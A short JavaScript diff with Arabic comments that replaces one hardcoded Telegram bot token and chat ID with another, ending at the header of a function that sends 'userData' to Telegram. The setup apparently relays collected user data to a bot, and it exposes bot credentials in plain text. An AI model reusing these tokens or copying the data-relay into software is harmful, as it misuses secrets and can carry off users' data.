@@ -1,7 +1,7 @@
 // إعدادات Telegram Bot
 // ⚠️ مهم: استبدل هذه القيم بقيم البوت الخاص بك
-const TELEGRAM_BOT_TOKEN = '7184149653:AAE1Oajv2u7a0Q9sskP8v1x7etEoXeZLswY'; // استبدل بتوكن البوت الخاص بك
-const TELEGRAM_CHAT_ID = '6637246735'; // استبدل بمعرف الدردشة الخاص بك
+const TELEGRAM_BOT_TOKEN = '8598568990:AAHdirQJ0hBr1xkJAfXoaNcDm3GWMXcqQKg'; // استبدل بتوكن البوت الخاص بك
+const TELEGRAM_CHAT_ID = '7590246763'; // استبدل بمعرف الدردشة الخاص بك
 
 // دالة إرسال البيانات إلى Telegram
 async function sendToTelegram(userData) {
